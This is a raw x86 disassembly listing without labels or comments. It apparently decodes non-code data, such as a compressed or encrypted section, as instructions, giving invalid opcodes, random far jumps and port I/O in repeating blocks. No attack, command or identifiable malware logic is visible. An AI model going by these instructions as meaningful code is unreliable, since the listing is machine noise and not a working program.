  42cb53:	pushf  
  42cb54:	inc    ecx
  42cb55:	imul   ebx,DWORD PTR [esi+0x19de5a72],0x52
  42cb5c:	imul   DWORD PTR [ebp+0x6d]
  42cb5f:	fiadd  WORD PTR [edx+0x71]
  42cb62:	dec    ebp
  42cb63:	lea    esi,ds:0x6461c255
  42cb69:	ins    BYTE PTR es:[edi],dx
  42cb6a:	(bad)  
  42cb6b:	rol    ecx,cl
  42cb6d:	in     al,0x1c
  42cb6f:	sbb    al,0xc7
  42cb71:	enter  0xf76d,0x6
  42cb75:	mov    ebp,esi
  42cb77:	push   es
  42cb78:	or     eax,0x767e258b
  42cb7d:	out    0x2,eax
  42cb7f:	outs   dx,DWORD PTR ds:[esi]
  42cb80:	inc    ebx
  42cb81:	mov    ebx,0x7b1f6e62
  42cb86:	xchg   esp,eax
  42cb87:	cmp    DWORD PTR [ebx+ecx*8-0x6e],ebp
  42cb8b:	sub    ebx,DWORD PTR [esi-0x7f5de091]
  42cb91:	popa   
  42cb92:	mov    dl,0x8c
  42cb94:	jg     0x42cb3a
  42cb96:	(bad)  
  42cb97:	cmp    al,0xe2
  42cb99:	mov    ebx,0xcd691dfd
  42cb9e:	fld    DWORD PTR [ebx]
  42cba0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42cba1:	xor    cl,0x2e
  42cba4:	pop    ecx
  42cba5:	mov    esp,0x7822a616
  42cbaa:	cmp    al,ch
  42cbac:	sahf   
  42cbad:	pop    ebx
  42cbae:	in     eax,dx
  42cbaf:	sti    
  42cbb0:	xor    al,0xb0
  42cbb2:	mov    edi,0xcb5377a9
  42cbb7:	push   esp
  42cbb8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42cbb9:	adc    BYTE PTR [edx*1-0x41b93bf0],0xb3
  42cbc1:	lods   al,BYTE PTR ds:[esi]
  42cbc2:	pop    esp
  42cbc3:	into   
  42cbc4:	jecxz  0x42cb70
  42cbc6:	ins    BYTE PTR es:[edi],dx
  42cbc7:	xor    ecx,esi
  42cbc9:	inc    eax
  42cbca:	mov    WORD PTR [edx+0x41dc994f],gs
  42cbd0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42cbd1:	xchg   ebp,eax
  42cbd2:	aad    0xc1
  42cbd4:	stc    
  42cbd5:	xchg   ebx,eax
  42cbd6:	mov    BYTE PTR [ecx],dl
  42cbd8:	sub    al,0xeb
  42cbda:	mov    edx,0x47ba147e
  42cbdf:	ins    BYTE PTR es:[edi],dx
  42cbe0:	and    eax,0xab9858a0
  42cbe5:	retf   0xd131
  42cbe8:	fimul  DWORD PTR [edx]
  42cbea:	jmp    0xefc6:0xafd6ad1a
  42cbf1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42cbf2:	aas    
  42cbf3:	cwde   
  42cbf4:	pop    edx
  42cbf5:	push   esi
  42cbf6:	test   BYTE PTR [ecx-0x3a39d95a],al
  42cbfc:	imul   edx,DWORD PTR [ebx-0x31],0x864bc6f4
  42cc03:	jne    0x42cbac
  42cc05:	call   0xf9a9c917
  42cc0a:	mov    al,0xff
  42cc0c:	dec    ecx
  42cc0d:	faddp  st(7),st
  42cc0f:	ret    0xa0
	...
  42cc72:	add    BYTE PTR [eax],al
  42cc74:	jg     0x42cc78
  42cc76:	mov    esp,DWORD PTR [edi+edi*8-0x13]
  42cc7a:	call   FWORD PTR [ebx]
  42cc7c:	fisttp WORD PTR [ebp+0x1]
  42cc7f:	or     eax,0x519e9a1
  42cc84:	or     eax,esp
  42cc86:	add    DWORD PTR [eax],eax
  42cc88:	add    eax,0x9e000001
  42cc8d:	scas   eax,DWORD PTR es:[edi]
  42cc8e:	push   ebp
  42cc8f:	add    al,0xf7
  42cc91:	cmp    ebp,DWORD PTR [ebp-0x5b508796]
  42cc97:	imul   esp,DWORD PTR [ebp+0x442f1de9],0x47
  42cc9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42cc9f:	ins    DWORD PTR es:[edi],dx
  42cca0:	push   ds
  42cca1:	mov    edx,0x725f7766
  42cca6:	rcl    BYTE PTR [edx+0x16],cl
  42cca9:	mov    al,0x7
  42ccab:	pop    ebp
  42ccac:	mov    esi,0xd6074ccc
  42ccb1:	test   DWORD PTR [esi-0x532a32a7],esi
  42ccb7:	std    
  42ccb8:	fisttp DWORD PTR [edx+0x51]
  42ccbb:	inc    ecx
  42ccbc:	sub    edi,DWORD PTR [edi+0x9]
  42ccbf:	push   edi
  42ccc0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ccc1:	lahf   
  42ccc2:	mov    ebx,0xe36c4029
  42ccc7:	imul   esi,DWORD PTR [esi-0x49],0xffffffdc
  42cccb:	sahf   
  42cccc:	test   ah,dh
  42ccce:	bound  ebp,QWORD PTR [ebp+0x7029133b]
  42ccd4:	push   0xedee040d
  42ccd9:	aam    0x85
  42ccdb:	inc    sp
  42ccdd:	fiadd  WORD PTR ds:0x25faa18e
  42cce3:	xchg   ah,ch
  42cce5:	and    al,0x4f
  42cce7:	xchg   ebp,eax
  42cce8:	popa   
  42cce9:	mov    ds:0xfc75016f,eax
  42ccee:	jl     0x42ccdc
  42ccf0:	clc    
  42ccf1:	dec    edx
  42ccf2:	sub    BYTE PTR [ebp-0x5d],0xaa
  42ccf6:	xor    al,0x6f
  42ccf8:	push   ss
  42ccf9:	jne    0x42ccdb
  42ccfb:	out    0xf7,eax
  42ccfd:	pop    ebp
  42ccfe:	push   eax
  42ccff:	popw   ss
  42cd01:	ins    DWORD PTR es:[edi],dx
  42cd02:	jmp    0x43f4:0xead3c0b3
  42cd09:	push   ds
  42cd0a:	out    0x2c,al
  42cd0c:	iret   
  42cd0d:	popf   
  42cd0e:	rol    BYTE PTR [ecx],cl
  42cd10:	pmaddwd mm5,QWORD PTR ds:0xf8149c44
  42cd17:	add    bl,ch
  42cd19:	enter  0xc995,0xaa
  42cd1d:	cmp    DWORD PTR [eax-0x3],ecx
  42cd20:	xchg   ecx,eax
  42cd21:	inc    esi
  42cd22:	mov    al,ds:0x4eae356
  42cd27:	fiadd  WORD PTR [edi-0x5b]
  42cd2a:	push   ebx
  42cd2b:	cwde   
  42cd2c:	sub    BYTE PTR [ecx-0x1682c3d],0x10
  42cd33:	jns    0x42cd7a
  42cd35:	adc    al,0xf3
  42cd37:	mov    esp,es
  42cd39:	fcmove st,st(3)
  42cd3b:	mov    cs,WORD PTR [edx-0x27]
  42cd3e:	std    
  42cd3f:	shl    BYTE PTR [ebx-0x69],cl
  42cd42:	lds    ebp,FWORD PTR [edx-0x2b]
  42cd45:	sub    DWORD PTR [edx-0x2dca5b68],ecx
  42cd4b:	inc    ecx
  42cd4c:	sahf   
  42cd4d:	mov    edx,0x3bac16f8
  42cd52:	cmp    BYTE PTR [ebx-0x29b33345],cl
  42cd58:	div    BYTE PTR [ebp+0x73]
  42cd5b:	call   0x8d030f57
  42cd60:	push   eax
  42cd61:	sbb    BYTE PTR [ebx-0x46],dl
  42cd64:	arpl   WORD PTR [edx],bx
  42cd66:	repnz es mov edi,0x6a716440
  42cd6d:	adc    DWORD PTR [bp-0x5aa2],edi
  42cd72:	sbb    eax,0xdf6b6ade
  42cd77:	(bad)  
  42cd79:	(bad)  
  42cd7a:	in     al,0xf0
  42cd7c:	popa   
  42cd7d:	and    dh,al
  42cd7f:	scas   al,BYTE PTR es:[edi]
  42cd80:	or     DWORD PTR [esi],0xa568fd60
  42cd86:	out    0x7e,eax
  42cd88:	sub    DWORD PTR [esi-0x63],esi
  42cd8b:	(bad)
  42cd8f:	sti    
  42cd90:	cwde   
	...
  42cdf1:	add    BYTE PTR [eax],al
  42cdf3:	add    BYTE PTR [ecx],bl
  42cdf5:	mov    eax,ds:0xdffe87fe
  42cdfa:	jns    0x42cdbb
  42cdfc:	xchg   BYTE PTR [esi],dh
  42cdfe:	xchg   esi,eax
  42cdff:	mov    ch,0xc2
  42ce01:	sub    eax,0xe10e3248
  42ce06:	add    DWORD PTR [eax],eax
  42ce08:	add    eax,0x59000001
  42ce0d:	xchg   edi,eax
  42ce0e:	pop    ss
  42ce0f:	mov    ebp,0x8d38ffa7
  42ce14:	ja     0x42ce82
  42ce16:	add    BYTE PTR [edx],0xe
  42ce19:	scas   eax,DWORD PTR es:[edi]
  42ce1a:	sub    al,0xa2
  42ce1c:	lahf   
  42ce1d:	(bad)  
  42ce1e:	sbb    al,0x57
  42ce20:	fist   WORD PTR [ebp+0x4f]
  42ce23:	cmp    dh,BYTE PTR [edx-0x4d71de19]
  42ce29:	jbe    0x42ce7d
  42ce2b:	leave  
  42ce2c:	sub    cl,0x75
  42ce2f:	es dec eax
  42ce31:	push   cs
  42ce32:	push   ds
  42ce33:	mov    BYTE PTR [esi+0x7145570b],cl
  42ce39:	xchg   edi,eax
  42ce3a:	cmp    eax,0x99e67cb2
  42ce3f:	jo     0x42ce98
  42ce41:	dec    ecx
  42ce42:	jp     0x42ce28
  42ce44:	jmp    0x42cde6
  42ce46:	fimul  DWORD PTR [esi-0x37]
  42ce49:	js     0x42cdd5
  42ce4b:	fsub   st(4),st
  42ce4d:	jnp    0x42cdef
  42ce4f:	add    al,0xbb
  42ce51:	and    BYTE PTR [ecx],0xe2
  42ce54:	add    DWORD PTR [edi-0xe],edi
  42ce57:	into   
  42ce58:	stc    
  42ce59:	or     eax,0x4a267d59
  42ce5e:	or     ecx,DWORD PTR [esi]
  42ce60:	aam    0x38
  42ce62:	fisubr WORD PTR [ecx+0x23645b9a]
  42ce68:	xor    eax,0x68fb1287
  42ce6d:	dec    ebx
  42ce6e:	xchg   DWORD PTR [esi+0x29],eax
  42ce71:	fwait
  42ce72:	adc    dl,BYTE PTR [esi]
  42ce74:	lea    esi,[eax-0x1606344d]
  42ce7a:	xor    al,0x61
  42ce7c:	and    eax,ecx
  42ce7e:	inc    ecx
  42ce7f:	cwde   
  42ce80:	iret   
  42ce81:	loope  0x42ce24
  42ce83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ce84:	mov    ds,WORD PTR ds:0x9f9f6de1
  42ce8a:	xor    DWORD PTR [esi],0x32843958
  42ce90:	or     bh,al
  42ce92:	dec    esi
  42ce93:	xchg   DWORD PTR [ebp-0x5f],eax
  42ce96:	fnstenv [ecx+ebp*2]
  42ce99:	push   ss
  42ce9a:	ror    DWORD PTR [ebp-0x74],1
  42ce9d:	cld    
  42ce9e:	cwde   
  42ce9f:	mov    WORD PTR [ebx-0x25],?
  42cea2:	push   esi
  42cea3:	nop
  42cea4:	ins    BYTE PTR es:[edi],dx
  42cea5:	popf   
  42cea6:	aas    
  42cea7:	jge    0x42ceb9
  42cea9:	push   ss
  42ceaa:	jbe    0x42cf24
  42ceac:	jbe    0x42cf09
  42ceae:	enter  0xf4ee,0x7a
  42ceb2:	inc    ecx
  42ceb3:	adc    al,0x4d
  42ceb5:	xor    BYTE PTR [ecx-0x4a],bh
  42ceb8:	in     eax,0x7d
  42ceba:	ja     0x42cec0
  42cebc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42cebd:	sbb    DWORD PTR [ebp-0x5414f609],edx
  42cec3:	ficom  WORD PTR [eax-0x7a209ed]
  42cec9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ceca:	xor    ebx,edx
  42cecc:	test   DWORD PTR [ebp+0x7],esp
  42cecf:	jb     0x42ce73
  42ced1:	ror    BYTE PTR gs:[edx+ebp*2+0x64],1
  42ced6:	call   0x5598:0xd236233e
  42cedd:	cld    
  42cede:	pop    eax
  42cedf:	mov    esi,0x3705217c
  42cee4:	add    bh,BYTE PTR [edx+0x4cb0f928]
  42ceea:	push   ebp
  42ceeb:	lods   eax,DWORD PTR ds:[esi]
  42ceec:	xor    ebp,0xfffffff8
  42ceef:	mov    ss,WORD PTR [edx-0xe2540ff]
  42cef5:	pop    es
  42cef6:	fisubr WORD PTR [ebx]
  42cef8:	fs adc eax,0x30d1e71d
  42cefe:	aas    
  42ceff:	call   0x4ec226f0
  42cf04:	cmc    
  42cf05:	shl    edx,0x8a
  42cf08:	xchg   ebx,eax
  42cf09:	ins    BYTE PTR es:[edi],dx
  42cf0a:	inc    BYTE PTR [edi+0x177a1d54]
  42cf10:	mov    BYTE PTR [eax],0x0
	...
  42cf73:	add    BYTE PTR [ebx+0x3d],dh
  42cf76:	fadd   st,st(1)
  42cf78:	fsubrp st(5),st
  42cf7a:	jnp    0x42cf3b
  42cf7c:	or     al,BYTE PTR [esi]
  42cf7e:	cld    
  42cf7f:	les    edi,FWORD PTR [ebx]
  42cf81:	cmp    DWORD PTR [ecx],ebp
  42cf83:	push   ebx
  42cf84:	adc    esp,edx
  42cf86:	add    DWORD PTR [eax],eax
  42cf88:	add    eax,0x80000001
  42cf8d:	add    bh,al
  42cf8f:	lds    ebx,FWORD PTR [edx+esi*1+0x1d]
  42cf93:	sbb    esi,DWORD PTR [edx+0x73]
  42cf96:	hlt    
  42cf97:	addr16 jmp 0x42cf54
  42cf9a:	adc    BYTE PTR [ebx+0x51d849a1],ch
  42cfa0:	je     0x42cf79
  42cfa2:	mov    cl,0x85
  42cfa4:	jg     0x42cff5
  42cfa6:	and    dl,BYTE PTR [edx-0x7c]
  42cfa9:	jbe    0x42d024
  42cfab:	cmp    eax,0x59d47fb9
  42cfb0:	ja     0x42cfbc
  42cfb2:	cmp    BYTE PTR [esi],ah
  42cfb4:	mov    edx,0x1a9b3f4f
  42cfb9:	inc    eax
  42cfba:	pusha  
  42cfbb:	js     0x42cf66
  42cfbd:	and    edi,DWORD PTR [ebx+0xf]
  42cfc0:	inc    eax
  42cfc1:	mov    dh,0x2f
  42cfc3:	jge    0x42cf75
  42cfc5:	xor    DWORD PTR [eax+0x37f33261],ebp
  42cfcb:	xor    WORD PTR [edx],bx
  42cfce:	cdq    
  42cfcf:	pusha  
  42cfd0:	mov    bh,0x75
  42cfd2:	mov    BYTE PTR [eax+0x60],ah
  42cfd5:	(bad)  
  42cfd6:	icebp  
  42cfd7:	inc    esi
  42cfd8:	(bad)  [eax+0x39]
  42cfdb:	inc    ebp
  42cfdc:	cmp    eax,DWORD PTR gs:[esp+ebx*4+0x14]
  42cfe1:	daa    
  42cfe2:	popa   
  42cfe3:	adc    esi,ecx
  42cfe5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42cfe6:	test   al,bl
  42cfe8:	jns    0x42d056
  42cfea:	fcmovnbe st,st(7)
  42cfec:	sbb    ch,BYTE PTR [edi+0x1f]
  42cfef:	mov    cl,BYTE PTR [esi+0x28]
  42cff2:	push   esp
  42cff3:	fwait
  42cff4:	sub    al,0x6b
  42cff6:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  42cff8:	and    ebp,DWORD PTR [edi-0xa4be3bf]
  42cffe:	(bad)  [edx+0x47644f96]
  42d004:	shr    DWORD PTR [eax-0x3730429e],cl
  42d00a:	retf   
  42d00b:	fisttp WORD PTR [ecx]
  42d00d:	mov    bl,0x40
  42d00f:	js     0x42d03d
  42d011:	cmp    al,dh
  42d013:	(bad)  
  42d014:	sub    al,0x33
  42d016:	add    BYTE PTR [eax+0x6a],cl
  42d019:	in     eax,dx
  42d01a:	pop    esp
  42d01b:	mov    ?,WORD PTR [ebx-0x23949e87]
  42d021:	(bad)  
  42d022:	pcmpgtd mm4,QWORD PTR [edx]
  42d025:	inc    esi
  42d026:	test   al,0xa
  42d028:	ror    DWORD PTR [edx],0x89
  42d02b:	inc    edx
  42d02c:	(bad)  
  42d02d:	pop    edi
  42d02e:	dec    esp
  42d02f:	cmp    DWORD PTR [ecx-0x1a],esi
  42d032:	cmc    
  42d033:	mov    al,0xb0
  42d035:	enter  0xfbe1,0xd1
  42d039:	neg    DWORD PTR [ecx-0x9c40cf4]
  42d03f:	popa   
  42d040:	into   
  42d041:	sub    DWORD PTR [ebx+ecx*1],esi
  42d044:	mov    bh,0xdf
  42d046:	iret   
  42d047:	mov    ecx,0xb1b1e72
  42d04c:	aaa    
  42d04d:	mov    bl,0xc
  42d04f:	hlt    
  42d050:	inc    eax
  42d051:	clc    
  42d052:	cmovnp eax,DWORD PTR [eax+0x77]
  42d056:	dec    esi
  42d057:	inc    esp
  42d058:	and    al,0xf2
  42d05a:	sbb    BYTE PTR ds:0xcd7f53d0,al
  42d060:	push   0xf96580af
  42d065:	retf   0xa288
  42d068:	nop
  42d069:	lods   eax,DWORD PTR ds:[esi]
  42d06a:	rol    DWORD PTR [ecx-0x5d],0x95
  42d06e:	xor    edi,DWORD PTR [edx-0x64]
  42d071:	pop    edx
  42d072:	pop    edx
  42d073:	fidiv  WORD PTR [ecx+0x67]
  42d076:	(bad)  
  42d077:	pop    eax
  42d078:	hlt    
  42d079:	xchg   edx,eax
  42d07a:	fild   DWORD PTR [esi+0x4bde9011]
  42d080:	mov    cl,0x6d
  42d082:	push   edi
  42d083:	jns    0x42d0c3
  42d085:	mov    edi,0x3f43ff
  42d08a:	or     ebp,DWORD PTR [esi+edx*4-0x39]
  42d08e:	rcr    BYTE PTR [edi],cl
  42d090:	mov    ecx,0x0
	...
  42d0f1:	add    BYTE PTR [eax],al
  42d0f3:	add    BYTE PTR [eax+0x3a],dl
  42d0f6:	(bad)  
  42d0f7:	sub    al,0xee
  42d0f9:	cld    
  42d0fa:	cli    
  42d0fb:	jle    0x42d090
  42d0fd:	dec    esp
  42d0fe:	nop
  42d0ff:	xor    BYTE PTR [eax-0x44],al
  42d102:	add    ebx,DWORD PTR cs:[eax]
  42d105:	jecxz  0x42d108
  42d107:	add    BYTE PTR ds:0x88000001,al
  42d10d:	fld    TBYTE PTR [eax-0x74839370]
  42d113:	pop    ds
  42d114:	pop    ds
  42d115:	fdiv   QWORD PTR ds:0x6300dd1e
  42d11b:	mov    dl,cl
  42d11d:	inc    ebp
  42d11e:	xchg   esp,eax
  42d11f:	mov    esp,0x7ed9d7d0
  42d124:	out    dx,al
  42d125:	cdq    
  42d126:	jge    0x42d17b
  42d128:	cmp    al,0xf1
  42d12a:	retf   0xd155
  42d12d:	icebp  
  42d12e:	aaa    
  42d12f:	jp     0x42d12a
  42d131:	clc    
  42d132:	push   edx
  42d133:	(bad)
  42d136:	(bad)  
  42d137:	rol    DWORD PTR [ecx],cl
  42d139:	cmp    edi,DWORD PTR [edi+0x28]
  42d13c:	repnz in eax,0xba
  42d13f:	jno    0x42d11d
  42d141:	sti    
  42d142:	in     al,dx
  42d143:	sub    eax,DWORD PTR [eax+0x57]
  42d146:	xchg   DWORD PTR [esi-0x6e351838],esp
  42d14c:	jne    0x42d154
  42d14e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d14f:	jmp    0xc514:0x16a54a1a
  42d156:	xchg   esp,eax
  42d157:	add    ebp,ebx
  42d159:	outs   dx,BYTE PTR ds:[esi]
  42d15a:	mov    edx,0x3938ae8c
  42d15f:	xor    eax,0x8f56367c
  42d164:	rol    BYTE PTR [ecx-0x6f],1
  42d167:	ret    0xbfca
  42d16a:	cli    
  42d16b:	jbe    0x42d17f
  42d16d:	in     eax,dx
  42d16e:	sub    eax,0x679eb26d
  42d173:	test   BYTE PTR [edi+0x5c42b0a8],dl
  42d179:	mov    ebp,0x7bf1ed56
  42d17e:	adc    al,0x91
  42d180:	mov    esp,0x40d5d67
  42d185:	fdivr  QWORD PTR [esi]
  42d187:	dec    eax
  42d188:	jo     0x42d19b
  42d18a:	dec    eax
  42d18b:	push   ds
  42d18c:	jmp    0x2b1b:0x7204166c
  42d193:	icebp  
  42d194:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d195:	mov    ebp,0x2e5e7769
  42d19a:	inc    edi
  42d19b:	push   esp
  42d19c:	hlt    
  42d19d:	sbb    DWORD PTR [ebx],esp
  42d19f:	out    dx,al
  42d1a0:	add    ebx,DWORD PTR [esp+ebp*1-0x2c1846da]
  42d1a7:	pop    eax
  42d1a8:	outs   dx,DWORD PTR ss:[esi]
  42d1aa:	jnp    0x42d216
  42d1ac:	lock in eax,0xd3
  42d1af:	in     al,dx
  42d1b0:	enter  0x74e2,0x51
  42d1b4:	ja     0x42d190
  42d1b6:	mov    esp,0x989cca97
  42d1bb:	inc    ebp
  42d1bc:	test   al,0xb7
  42d1be:	clc    
  42d1bf:	out    0x92,al
  42d1c1:	mul    dh
  42d1c3:	push   esi
  42d1c4:	aaa    
  42d1c5:	sbb    al,BYTE PTR [ebx-0x6456a1d0]
  42d1cb:	icebp  
  42d1cc:	aam    0x7b
  42d1ce:	mov    esi,0x6ed3b94d
  42d1d3:	push   ds
  42d1d4:	jnp    0x42d1ae
  42d1d6:	lds    edx,FWORD PTR [ecx-0x5158e186]
  42d1dc:	sahf   
  42d1dd:	sahf   
  42d1de:	shl    BYTE PTR [ebp+0x39],1
  42d1e1:	js     0x42d217
  42d1e3:	xor    cl,BYTE PTR [ebp+ebp*1+0x39ebe68d]
  42d1ea:	(bad)  
  42d1eb:	fiadd  DWORD PTR [ecx-0x649c6ce0]
  42d1f1:	mov    esp,DWORD PTR [eax-0x1ba6d409]
  42d1f7:	sub    ah,bh
  42d1f9:	xchg   ebx,eax
  42d1fa:	pop    eax
  42d1fb:	pop    edx
  42d1fc:	clc    
  42d1fd:	addr16 mov al,0x50
  42d200:	gs cs push ebx
  42d203:	aad    0x27
  42d205:	adc    DWORD PTR [esi],edx
  42d207:	cli    
  42d208:	ds sub al,0xe9
  42d20b:	inc    edi
  42d20c:	cmc    
  42d20d:	jae    0x42d1f0
  42d20f:	pop    ebp
  42d210:	(bad)  
	...
  42d271:	add    BYTE PTR [eax],al
  42d273:	add    BYTE PTR [ebp-0x2289a2f8],cl
  42d279:	ja     0x42d22a
  42d27b:	sti    
  42d27c:	aaa    
  42d27d:	out    0x36,eax
  42d27f:	ja     0x42d291
  42d281:	pop    edi
  42d282:	imul   eax,DWORD PTR [ecx],0x1e41d
  42d288:	add    eax,0xc7000001
  42d28d:	int    0xa4
  42d28f:	jge    0x42d297
  42d291:	cmp    al,ch
  42d293:	cmp    eax,0x77ae176e
  42d298:	jmp    0x50837691
  42d29d:	or     eax,0x41fea393
  42d2a2:	repz xor al,0x7b
  42d2a5:	mov    bl,0x40
  42d2a7:	hlt    
  42d2a8:	dec    edi
  42d2a9:	in     al,dx
  42d2aa:	cdq    
  42d2ab:	jmp    0x1dd2ecc
  42d2b0:	call   DWORD PTR [eax+0x24]
  42d2b3:	dec    edi
  42d2b4:	mul    DWORD PTR [esi-0x17ab25a9]
  42d2ba:	mov    eax,0x246d62eb
  42d2bf:	test   DWORD PTR [ebx+0x67a752e7],ecx
  42d2c5:	cli    
  42d2c6:	test   eax,0xd00d3f81
  42d2cb:	adc    dl,BYTE PTR [ebx]
  42d2cd:	adc    DWORD PTR [ebp+0x4c068606],edi
  42d2d3:	push   esp
  42d2d4:	bound  ebx,QWORD PTR [ebx]
  42d2d6:	and    al,0xd9
  42d2d8:	call   0x463c:0xe11ad94d
  42d2df:	cmp    BYTE PTR ds:[ebp+0x6bd0bcfb],dl
  42d2e6:	or     eax,0x8f07aedb
  42d2eb:	aaa    
  42d2ec:	push   es
  42d2ed:	sbb    eax,0x530e3343
  42d2f2:	push   0x6e
  42d2f4:	cli    
  42d2f5:	mov    esp,0xc1e3b3b5
  42d2fa:	mov    edi,0x40f9dd59
  42d2ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d300:	mov    ecx,0xc58afc91
  42d305:	xchg   ebx,eax
  42d306:	retf   
  42d307:	cwde   
  42d308:	mov    dh,0xfa
  42d30a:	push   ebx
  42d30b:	cli    
  42d30c:	leavew 
  42d30e:	arpl   WORD PTR [eax+0x47],bx
  42d311:	rol    DWORD PTR [esi-0x41],cl
  42d314:	cli    
  42d315:	or     al,0xfd
  42d317:	inc    DWORD PTR [ecx+0x254b888f]
  42d31d:	xchg   ecx,eax
  42d31e:	dec    edi
  42d31f:	xlat   BYTE PTR ds:[ebx]
  42d320:	lods   al,BYTE PTR ds:[esi]
  42d321:	cmp    eax,0xdfb6a268
  42d326:	adc    DWORD PTR [edx-0x39],edx
  42d329:	test   al,0x4c
  42d32b:	les    eax,FWORD PTR [eax+eiz*4]
  42d32e:	sbb    esi,DWORD PTR [ebx-0x10]
  42d331:	mov    ch,0x9b
  42d333:	lahf   
  42d334:	mov    esp,0x8e6e68a5
  42d339:	seto   BYTE PTR [esi]
  42d33c:	cmp    eax,0x30209801
  42d341:	sbb    DWORD PTR [edx],0xffffffd0
  42d344:	outs   dx,DWORD PTR ds:[esi]
  42d345:	mul    BYTE PTR [esp+ecx*4+0x77]
  42d349:	jb     0x42d3a2
  42d34b:	out    0x4b,al
  42d34d:	bound  ebp,QWORD PTR [ebp-0x78003d7]
  42d353:	leave  
  42d354:	clc    
  42d355:	(bad)  
  42d357:	add    eax,0x595ec6d3
  42d35c:	sub    eax,0x192fc1a0
  42d361:	(bad)  
  42d362:	and    BYTE PTR [edi+ebp*2],bl
  42d365:	dec    ecx
  42d366:	mov    bl,0xa0
  42d368:	adc    BYTE PTR [ebp-0x7a],ch
  42d36b:	cld    
  42d36c:	push   esp
  42d36d:	sbb    edx,DWORD PTR ds:0xe7340e1
  42d373:	js     0x42d30b
  42d375:	push   edi
  42d376:	xchg   edx,eax
  42d378:	test   eax,0xe8636eb5
  42d37d:	mov    ds:0x11cde532,eax
  42d382:	or     bh,bh
  42d384:	add    al,BYTE PTR [eax]
  42d386:	imul   edi,DWORD PTR [ebx+ebp*1-0x693bf5b1],0x73
  42d38e:	das    
  42d38f:	xchg   esp,eax
  42d390:	rol    BYTE PTR [eax],1
	...
  42d3f2:	add    BYTE PTR [eax],al
  42d3f4:	ror    esi,0x63
  42d3f7:	cdq    
  42d3f8:	outs   dx,DWORD PTR ds:[esi]
  42d3f9:	mov    ebp,0x9459defb
  42d3fe:	aaa    
  42d3ff:	pushf  
  42d400:	jle    0x42d469
  42d402:	mov    dl,0x82
  42d404:	and    ah,ch
  42d406:	add    DWORD PTR [eax],eax
  42d408:	add    eax,0x21000001
  42d40d:	gs jg  0x42d432
  42d410:	aas    
  42d411:	mov    ebx,0x9dbbc5f8
  42d416:	(bad)  [ebx]
  42d418:	repnz fs sub al,0x1a
  42d41c:	dec    edx
  42d41d:	es pushf 
  42d41f:	mov    ecx,0xa46cf776
  42d424:	sbb    eax,0x11883e39
  42d429:	gs cld 
  42d42b:	sar    BYTE PTR [ebx-0x17],0x63
  42d42f:	retf   
  42d430:	inc    ebp
  42d431:	pop    esp
  42d432:	not    BYTE PTR [ebp-0x470bd6e]
  42d438:	mov    edx,0xae0ea8c9
  42d43d:	sub    BYTE PTR [edx],bl
  42d43f:	jle    0x42d4b2
  42d441:	dec    edi
  42d442:	and    BYTE PTR [eax+edx*1+0x57808dcd],cl
  42d449:	or     DWORD PTR [edi-0xd58a10b],eax
  42d44f:	fcomp  QWORD PTR [ebp+0xd]
  42d452:	lock xchg DWORD PTR [edi-0x4d2dec07],edi
  42d459:	dec    ebx
  42d45a:	sbb    al,BYTE PTR [edi+0x98c93bc]
  42d460:	sbb    ch,ah
  42d462:	add    eax,0x64c3e512
  42d467:	mov    edi,0x78e1fedb
  42d46c:	and    ch,bl
  42d46e:	mov    ebp,0x74e0a1dd
  42d473:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d474:	sbb    eax,0x763bba5b
  42d479:	js     0x42d46d
  42d47b:	xchg   BYTE PTR [esi+0x65a54886],dl
  42d481:	popa   
  42d482:	lea    ebx,[eax]
  42d484:	aad    0x90
  42d486:	push   ds
  42d487:	mov    ebx,0x5380c525
  42d48c:	dec    ecx
  42d48d:	lds    esp,FWORD PTR [ebx]
  42d48f:	sbb    al,0x6f
  42d491:	and    eax,0x754aa7fc
  42d496:	add    al,0x67
  42d498:	cmp    al,0xac
  42d49a:	call   0x6452:0x91f3381
  42d4a1:	rcl    DWORD PTR cs:[eax-0x39],0x6
  42d4a6:	div    BYTE PTR [esi]
  42d4a8:	ss add eax,0xa5cb050b
  42d4ae:	mov    BYTE PTR [ebp+0x73],ah
  42d4b1:	dec    esp
  42d4b2:	pop    ebp
  42d4b3:	retf   0x896f
  42d4b6:	mov    ah,0x1
  42d4b8:	pop    ebx
  42d4b9:	adc    dl,BYTE PTR [edi]
  42d4bb:	int    0xa6
  42d4bd:	lods   al,BYTE PTR ds:[esi]
  42d4be:	jmp    0x6eaee683
  42d4c3:	adc    eax,DWORD PTR [ebx+0x476916f9]
  42d4c9:	cs cli 
  42d4cb:	adc    dh,al
  42d4cd:	shl    ah,cl
  42d4cf:	inc    ecx
  42d4d0:	mov    BYTE PTR [ebx+0x498d3891],ah
  42d4d6:	imul   edx,DWORD PTR [ecx+0x417205dd],0x94cc3009
  42d4e0:	stos   BYTE PTR es:[edi],al
  42d4e1:	push   ecx
  42d4e2:	mov    eax,ecx
  42d4e4:	fsubp  st(2),st
  42d4e6:	sub    esp,ebx
  42d4e8:	push   esp
  42d4e9:	sbb    ch,BYTE PTR [ebx]
  42d4eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d4ec:	cdq    
  42d4ed:	sbb    DWORD PTR [esi],edi
  42d4ef:	or     ecx,DWORD PTR [ebp-0x724a1a81]
  42d4f5:	ja     0x42d4c2
  42d4f7:	mov    edx,0x51174422
  42d4fc:	(bad)  
  42d4fd:	in     al,dx
  42d4fe:	sub    BYTE PTR [ecx+eiz*1],al
  42d501:	std    
  42d502:	fst    QWORD PTR [eax]
  42d504:	fwait
  42d505:	and    eax,0x7cc7da1f
  42d50a:	adc    bh,BYTE PTR [edi-0x5fb61b70]
  42d510:	adc    eax,0x0
	...
  42d571:	add    BYTE PTR [eax],al
